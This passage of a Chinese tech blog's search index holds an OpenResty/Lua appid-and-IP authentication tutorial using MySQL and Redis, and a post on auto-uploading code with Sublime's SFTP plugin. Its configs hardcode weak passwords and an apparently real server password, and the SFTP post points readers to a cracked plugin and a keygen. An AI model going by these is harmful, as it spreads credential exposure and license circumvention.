class="keyword">then</span></span><br><span class="line">        ngx.say(fun:resJson(-1,<span class="string">'该项目，非法操作或没有授予权限，被拦截'</span>))</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    end</span><br><span class="line"> </span><br><span class="line">    --所有验证通过，最后写入redis缓存</span><br><span class="line">    ok, err = reds:set_key(get_info,1)</span><br><span class="line">    ngx.say(fun:resJson(0,<span class="string">'该项目鉴权成功,可以访问'</span>));</span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">end</span><br><span class="line">--3.redis找到了信息鉴权成功</span><br><span class="line">ngx.say(fun:resJson(0,<span class="string">"该项目鉴权成功,可以访问!"</span>))</span><br></pre></td></tr></table></figure><h3 id="ini-lua"><a href="#ini-lua" class="headerlink" title="ini.lua"></a>ini.lua</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--配置相关方法</span><br><span class="line"><span class="built_in">local</span> _CONF = &#123;&#125;</span><br><span class="line">--返回redis配置文件</span><br><span class="line"><span class="keyword">function</span> _CONF.redis()</span><br><span class="line">    <span class="built_in">local</span>  redis_config = &#123;host=<span class="string">'127.0.0.1'</span>,pass=<span class="string">'123456'</span>,port=6379&#125; --redis配置项</span><br><span class="line">    <span class="built_in">return</span> redis_config</span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line">--返回mysql配置文件</span><br><span class="line"><span class="keyword">function</span> _CONF.mysql()</span><br><span class="line">    <span class="built_in">local</span> mysql_config = &#123;host=<span class="string">'127.0.0.1'</span>,port=3306,database=<span class="string">'test'</span>,user=<span class="string">'root'</span>,password=<span class="string">'123456'</span>&#125; --mysql的配置项</span><br><span class="line">    <span class="built_in">return</span> mysql_config</span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line"><span class="built_in">return</span> _CONF</span><br></pre></td></tr></table></figure><h3 id="mysql-pool-lua"><a href="#mysql-pool-lua" class="headerlink" title="mysql_pool.lua"></a>mysql_pool.lua</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">--连接mysql</span><br><span class="line"><span class="built_in">local</span> mysql = require <span class="string">"resty.mysql"</span></span><br><span class="line"><span class="built_in">local</span> mysql_pool = &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> mysql_pool:get_connect()</span><br><span class="line"><span class="keyword">if</span> ngx.ctx[mysql_pool] <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">return</span> <span class="literal">true</span>,<span class="string">'返回mysql连接池成功'</span>,ngx.ctx[mysql_pool]</span><br><span class="line">end</span><br><span class="line"><span class="built_in">local</span> db, err_mysql = mysql:new()</span><br><span class="line"><span class="keyword">if</span> not db <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>,<span class="string">"failed to instantiate mysql"</span></span><br><span class="line">end</span><br><span class="line">db:set_timeout(1000) -- 1 sec</span><br><span class="line"><span class="built_in">local</span> ok, err_mysql, errno, sqlstate = db:connect&#123;</span><br><span class="line">    host = conf.mysql()[<span class="string">'host'</span>],</span><br><span class="line">    port = conf.mysql()[<span class="string">'port'</span>],</span><br><span class="line">    database = conf.mysql()[<span class="string">'database'</span>],</span><br><span class="line">    user = conf.mysql()[<span class="string">'user'</span>],</span><br><span class="line">    password = conf.mysql()[<span class="string">'password'</span>],</span><br><span class="line">    max_packet_size = 1024 * 1024</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> not ok <span class="keyword">then</span></span><br><span class="line">--ngx.say(fun.resJson(-1,<span class="string">"mysql connect failed"</span>))</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>,<span class="string">"mysql conncet failed"</span></span><br><span class="line">end</span><br><span class="line">--存储mysql连接池并返回</span><br><span class="line">ngx.ctx[mysql_pool] = db</span><br><span class="line"><span class="built_in">return</span> <span class="literal">true</span>,<span class="string">'mysql连接成功'</span>,ngx.ctx[mysql_pool]</span><br><span class="line"> </span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">--关闭mysql连接池</span><br><span class="line"><span class="keyword">function</span> mysql_pool:close()</span><br><span class="line"><span class="keyword">if</span> ngx.ctx[mysql_pool] <span class="keyword">then</span></span><br><span class="line">ngx.ctx[mysql_pool]:set_keepalive(60000, 1000)</span><br><span class="line">ngx.ctx[mysql_pool] = nil</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">--执行sql查询</span><br><span class="line"><span class="keyword">function</span> mysql_pool:query(sql)</span><br><span class="line">--ngx.say(sql)</span><br><span class="line"><span class="built_in">local</span> ret,msg,client = self:get_connect()</span><br><span class="line">--连接数据库失败，返回错误信息</span><br><span class="line"><span class="keyword">if</span> not ret <span class="keyword">then</span></span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>,msg</span><br><span class="line">end</span><br><span class="line">--连接成功后执行sql查询,执行失败返回错误信息</span><br><span class="line"><span class="built_in">local</span> res,errmsg,errno,sqlstate = client:query(sql)</span><br><span class="line">--self:close()</span><br><span class="line"><span class="keyword">if</span> not res <span class="keyword">then</span></span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>,errmsg</span><br><span class="line">end</span><br><span class="line">--ngx.say(res[1][<span class="string">'appid'</span>])</span><br><span class="line">--ngx.say(res[1][<span class="string">'ip'</span>])</span><br><span class="line">--执行成功，返回信息</span><br><span class="line"><span class="built_in">return</span> <span class="literal">true</span>,<span class="string">"查询信息成功"</span>,res</span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line"><span class="built_in">return</span> mysql_pool</span><br></pre></td></tr></table></figure><p>　　</p><h3 id="redis-pool-lua"><a href="#redis-pool-lua" class="headerlink" title="redis_pool.lua"></a>redis_pool.lua</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">local</span> redis = require(<span class="string">"resty.redis"</span>)</span><br><span class="line"><span class="built_in">local</span> redis_pool = &#123;&#125;</span><br><span class="line">--连接redis</span><br><span class="line"><span class="keyword">function</span> redis_pool:get_connect()</span><br><span class="line">    <span class="keyword">if</span> ngx.ctx[redis_pool] <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>,<span class="string">"redis连接成功"</span>,ngx.ctx[redis_pool]</span><br><span class="line">    end</span><br><span class="line">    <span class="built_in">local</span> red = redis:new()</span><br><span class="line">    red:set_timeout(1000) -- 1 sec</span><br><span class="line">    <span class="built_in">local</span> ok, err = red:connect(conf.redis()[<span class="string">'host'</span>],conf.redis()[<span class="string">'port'</span>])</span><br><span class="line"><span class="keyword">if</span> not ok <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>,<span class="string">"failed to connect redis"</span></span><br><span class="line">end</span><br><span class="line">--设置redis密码</span><br><span class="line"><span class="built_in">local</span> count, err = red:get_reused_times()</span><br><span class="line"><span class="keyword">if</span> 0 == count <span class="keyword">then</span></span><br><span class="line">    ok, err = red:auth(conf.redis()[<span class="string">'pass'</span>])</span><br><span class="line"><span class="keyword">if</span> not ok <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>,<span class="string">"redis failed to auth"</span></span><br><span class="line">end</span><br><span class="line">    elseif err <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>,<span class="string">"redis failed to get reused times"</span></span><br><span class="line">end</span><br><span class="line">--选择redis数据库</span><br><span class="line">ok, err = red:select(0)</span><br><span class="line"><span class="keyword">if</span> not ok <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>,<span class="string">"redis connect failed "</span></span><br><span class="line">end</span><br><span class="line">--建立redis连接池</span><br><span class="line">ngx.ctx[redis_pool] = red</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">true</span>,<span class="string">'redis连接成功'</span>,ngx.ctx[redis_pool]</span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line">--关闭连接池</span><br><span class="line"><span class="keyword">function</span> redis_pool:close()</span><br><span class="line">    <span class="keyword">if</span> ngx.ctx[redis_pool] <span class="keyword">then</span></span><br><span class="line">        ngx.ctx[redis_pool]:set_keepalive(60000, 300)</span><br><span class="line">        ngx.ctx[redis_pool] = nil</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">---获取key的值</span><br><span class="line"><span class="keyword">function</span> redis_pool:get_key(str)</span><br><span class="line">    <span class="built_in">local</span> res,err,client = self:get_connect()</span><br><span class="line">    <span class="keyword">if</span> not res <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>,err</span><br><span class="line">    end</span><br><span class="line"><span class="built_in">local</span> keys = client:get(str)</span><br><span class="line">--self:close()</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">true</span>,<span class="string">"获取key成功"</span>,keys</span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line">--设置key的值</span><br><span class="line"><span class="keyword">function</span> redis_pool:set_key(str,value)</span><br><span class="line">    <span class="built_in">local</span> res,err,client = self:get_connect()</span><br><span class="line">        <span class="keyword">if</span> not res <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>,err</span><br><span class="line">end</span><br><span class="line">client:<span class="built_in">set</span>(str,value)</span><br><span class="line">--self:close()</span><br><span class="line"><span class="built_in">return</span> <span class="literal">true</span>,<span class="string">"成功设置key"</span></span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line"><span class="built_in">return</span> redis_pool</span><br></pre></td></tr></table></figure><h3 id="fun-lua"><a href="#fun-lua" class="headerlink" title="fun.lua"></a>fun.lua</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">local</span> _M = &#123;&#125;</span><br><span class="line"></span><br><span class="line">--返回json信息公用方法</span><br><span class="line"><span class="keyword">function</span> _M:resJson(status,mes)</span><br><span class="line">    <span class="built_in">local</span> arr_return = &#123;&#125;</span><br><span class="line">    arr_return[<span class="string">'status'</span>] = status</span><br><span class="line">    arr_return[<span class="string">'msg'</span>] = mes</span><br><span class="line">    <span class="built_in">return</span> cjson.encode(arr_return)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">--字符串按指定字符拆分公用方法</span><br><span class="line"><span class="keyword">function</span> _M:lua_string_split(str, split_char)    </span><br><span class="line">    <span class="built_in">local</span> sub_str_tab = &#123;&#125;; </span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) <span class="keyword">do</span>        </span><br><span class="line">        <span class="built_in">local</span> pos = string.find(str, split_char);  </span><br><span class="line">        <span class="keyword">if</span> (not pos) <span class="keyword">then</span>            </span><br><span class="line">            <span class="built_in">local</span> size_t = table.getn(sub_str_tab)</span><br><span class="line">            table.insert(sub_str_tab,size_t+1,str);</span><br><span class="line">            <span class="built_in">break</span>;  </span><br><span class="line">            end</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">local</span> sub_str = string.sub(str, 1, pos - 1);              </span><br><span class="line">        <span class="built_in">local</span> size_t = table.getn(sub_str_tab)</span><br><span class="line">        table.insert(sub_str_tab,size_t+1,sub_str);</span><br><span class="line">        <span class="built_in">local</span> t = string.len(str);</span><br><span class="line">        str = string.sub(str, pos + 1, t);   </span><br><span class="line">    end    </span><br><span class="line">    <span class="built_in">return</span> sub_str_tab;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--检测post过来的参数合法性</span><br><span class="line"><span class="keyword">function</span> _M:check_post_arg()</span><br><span class="line">    <span class="built_in">local</span> rule_count =  3</span><br><span class="line">    --接收POST过来的数据</span><br><span class="line">    ngx.req.read_body()</span><br><span class="line">    <span class="built_in">local</span> arg = ngx.req.get_post_args()</span><br><span class="line">    <span class="built_in">local</span> arg_count = 0 --存储参数个数</span><br><span class="line">    <span class="built_in">local</span> arg_table = &#123;appid,ip,appkey&#125;</span><br><span class="line">    <span class="built_in">local</span> get_info --参数拼接字符串，方便redis操作</span><br><span class="line">    --遍历post过来的参数</span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> pairs(arg) <span class="keyword">do</span></span><br><span class="line">        arg_count = arg_count+1</span><br><span class="line">        arg_table[k] = v</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    --参数赋值</span><br><span class="line">    appid = arg_table[<span class="string">'appid'</span>] </span><br><span class="line">    ip = arg_table[<span class="string">'ip'</span>]</span><br><span class="line">    appkey = arg_table[<span class="string">'appkey'</span>]</span><br><span class="line">    --判断参数个数传递过来的参数要与规定的个数一致</span><br><span class="line">    <span class="keyword">if</span> rule_count == arg_count <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> string.len(appid) == 0 <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">return</span>  &#123;status=-1,msg=<span class="string">'参数传递错误，被拦截'</span>&#125;</span><br><span class="line">        end</span><br><span class="line">        <span class="keyword">if</span> string.len(ip) == 0 <span class="keyword">then</span> </span><br><span class="line">            <span class="built_in">return</span>  &#123;status=-1,msg=<span class="string">'参数传递错误，被拦截'</span>&#125;</span><br><span class="line">        end</span><br><span class="line">        <span class="keyword">if</span> string.len(appkey) == 0 <span class="keyword">then</span> </span><br><span class="line">            <span class="built_in">return</span>  &#123;status=-1,msg=<span class="string">'参数传递错误，被拦截'</span>&#125;</span><br><span class="line">        end </span><br><span class="line">        ---参数正确返回参数信息</span><br><span class="line">        <span class="built_in">return</span>  &#123;status=0,msg=<span class="string">'参数校验成功'</span>,arg_tables=arg_table&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">return</span>  &#123;status=-1,msg=<span class="string">'参数传递错误，被拦截'</span>&#125;</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> _M</span><br></pre></td></tr></table></figure><h3 id="配置nginx-conf文件"><a href="#配置nginx-conf文件" class="headerlink" title="配置nginx.conf文件"></a>配置nginx.conf文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上面的lua文件都是放在/data/<span class="built_in">local</span>/openresty/lualib/myxz/目录下</span><br><span class="line">location /lua&#123;</span><br><span class="line">lua_code_cache on;</span><br><span class="line">content_by_lua_file /data/<span class="built_in">local</span>/openresty/lualib/myxz/purview.lua;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mysql数据设计"><a href="#mysql数据设计" class="headerlink" title="mysql数据设计"></a>mysql数据设计</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SET FOREIGN_KEY_CHECKS=0;</span><br><span class="line">DROP TABLE IF EXISTS `myxz_appid_list`;</span><br><span class="line">CREATE TABLE `myxz_appid_list` (</span><br><span class="line">`id` int(4) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">`appid` varchar(20) NOT NULL DEFAULT <span class="string">'appid相当于项目名称'</span>,</span><br><span class="line">`appkey` varchar(20) NOT NULL COMMENT <span class="string">'appid密码'</span>,</span><br><span class="line">`create_time` int(11) NOT NULL COMMENT <span class="string">'生产appid时间'</span>,</span><br><span class="line">PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=<span class="string">'项目appid对应关系表'</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">DROP TABLE IF EXISTS `myxz_appid_white_list`;</span><br><span class="line">CREATE TABLE `myxz_appid_white_list` (</span><br><span class="line">`id` int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">`appid` char(20) NOT NULL COMMENT <span class="string">'项目标示或名称'</span>,</span><br><span class="line">`ip` varchar(15) NOT NULL COMMENT <span class="string">'项目允许访问对应的ip地址'</span>,</span><br><span class="line">PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB</span><br></pre></td></tr></table></figure><h3 id="访问方法"><a href="#访问方法" class="headerlink" title="访问方法"></a>访问方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://192.168.3.128:8083/lua"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"appid"</span> value=<span class="string">'myxz'</span>&gt;&lt;/input&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"ip"</span> value=<span class="string">'192.168.3.2'</span>&gt;&lt;/input&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"appkey"</span> value=<span class="string">'67872'</span>&gt;&lt;/input&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"鉴权check"</span>&gt;&lt;/input&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h3><p>压力测试效果非常可观<br>qps可以达到2300</p>]]></content>
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lua </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sublime 自动上传代码至服务器</title>
      <link href="/sublime_sftp.html"/>
      <url>/sublime_sftp.html</url>
      <content type="html"><![CDATA[<p>代码更改保存自动上传至服务器</p><h3 id="sublime-安装插件sftp"><a href="#sublime-安装插件sftp" class="headerlink" title="sublime 安装插件sftp"></a>sublime 安装插件sftp</h3><ul><li>sftp插件安装就不用介绍了</li></ul><h3 id="项目配置"><a href="#项目配置" class="headerlink" title="项目配置"></a>项目配置</h3><ul><li>本地建一个目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-D盘</span><br><span class="line">--code</span><br><span class="line">---项目目录</span><br></pre></td></tr></table></figure><p> 项目目录右键，“SFTP/FTP-&gt;Map to Remote…”,生成配置文件sftp-config.json,查看破解版<a href="http://type.so/object-c/svn-sftp-plugin-keygen.html" target="_blank" rel="noopener">的</a></p><p> 下面是我的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    // The tab key will cycle through the settings when first created</span><br><span class="line">    // Visit http://wbond.net/sublime_packages/sftp/settings <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line">    </span><br><span class="line">    // sftp, ftp or ftps</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"sftp"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">"save_before_upload"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"upload_on_save"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"sync_down_on_open"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"sync_skip_deletes"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"sync_same_age"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"confirm_downloads"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"confirm_sync"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"confirm_overwrite_newer"</span>: <span class="literal">false</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="string">"host"</span>: <span class="string">"172.29.9.62"</span>,</span><br><span class="line">    <span class="string">"user"</span>: <span class="string">"developer"</span>,</span><br><span class="line">    <span class="string">"password"</span>: <span class="string">"devexhmfb@62"</span>,</span><br><span class="line">    <span class="string">"port"</span>: <span class="string">"8022"</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="string">"remote_path"</span>: <span class="string">"/data/wwwroot/myxz/"</span>,</span><br><span class="line">    <span class="string">"ignore_regexes"</span>: [</span><br><span class="line">        <span class="string">"\\.sublime-(project|workspace)"</span>, <span class="string">"sftp-config(-alt\\d?)?\\.json"</span>,</span><br><span class="line">        <span class="string">"sftp-settings\\.json"</span>, <span class="string">"/venv/"</span>, <span class="string">"\\.svn/"</span>, <span class="string">"\\.hg/"</span>, <span class="string">"\\.git/"</span>,</span><br><span class="line">        <span class="string">"\\.bzr"</span>, <span class="string">"_darcs"</span>, <span class="string">"CVS"</span>, <span class="string">"\\.DS_Store"</span>, <span class="string">"Thumbs\\.db"</span>, <span class="string">"desktop\\.ini"</span>,</span><br><span class="line">        <span class="string">"\\.xlsx"</span>,<span class="string">"\\.gitignore"</span>,<span class="string">"\\.gitattributes"</span>,<span class="string">"\\.buildpath"</span>,<span class="string">"\\.md"</span>,<span class="string">"\\.lock"</span>,<span class="string">"\\.json"</span>,<span class="string">"Document/"</span>,<span class="string">"Data/"</span>,<span class="string">"back/"</span>,<span class="string">"\\.project"</span></span><br><span class="line">    ],</span><br><span class="line">    //<span class="string">"file_permissions"</span>: <span class="string">"664"</span>,</span><br><span class="line">    //<span class="string">"dir_permissions"</span>: <span class="string">"775"</span>,</span><br><span class="line">    </span><br><span class="line">    //<span class="string">"extra_list_connections"</span>: 0,</span><br><span class="line"></span><br><span class="line">    <span class="string">"connect_timeout"</span>: 30,</span><br><span class="line">    //<span class="string">"keepalive"</span>: 120,</span><br><span class="line">    //<span class="string">"ftp_passive_mode"</span>: <span class="literal">true</span>,</span><br><span class="line">    //<span class="string">"ftp_obey_passive_host"</span>: <span class="literal">false</span>,</span><br><span class="line">    //<span class="string">"ssh_key_file"</span>: <span class="string">"~/.ssh/id_rsa"</span>,</span><br><span class="line">    //<span class="string">"sftp_flags"</span>: [<span class="string">"-F"</span>, <span class="string">"/path/to/ssh_config"</span>],</span><br><span class="line">    </span><br><span class="line">    //<span class="string">"preserve_modification_times"</span>: <span class="literal">false</span>,</span><br><span class="line">    //<span class="string">"remote_time_offset_in_hours"</span>: 0,</span><br><span class="line">    <span class="string">"remote_encoding"</span>: <span class="string">"cp1258"</span></span><br><span class="line">    //<span class="string">"remote_locale"</span>: <span class="string">"C"</span>,</span><br><span class="line">    //<span class="string">"allow_config_upload"</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>目录对应一直</li><li>修改 “remote_encoding”: “cp1258” 不然会报错</li><li>可以开启”sync_down_on_open”: true 不用每次打开都要down下，一次down成功就可以了</li><li>排除一些敏感文件，防止误操作</li><li>破解sftp可以自行Google “sftp keygen” ，<a href="https://wbond.net/sublime_packages/sftp/usage" target="_blank" rel="noopener">sftp快捷键</a></li></ul>]]></content>
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sublime </tag>
            
            <tag> sftp </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php解析xml</title>
      <link href="/php_xml.html"/>
      <url>/php_xml.html</url>
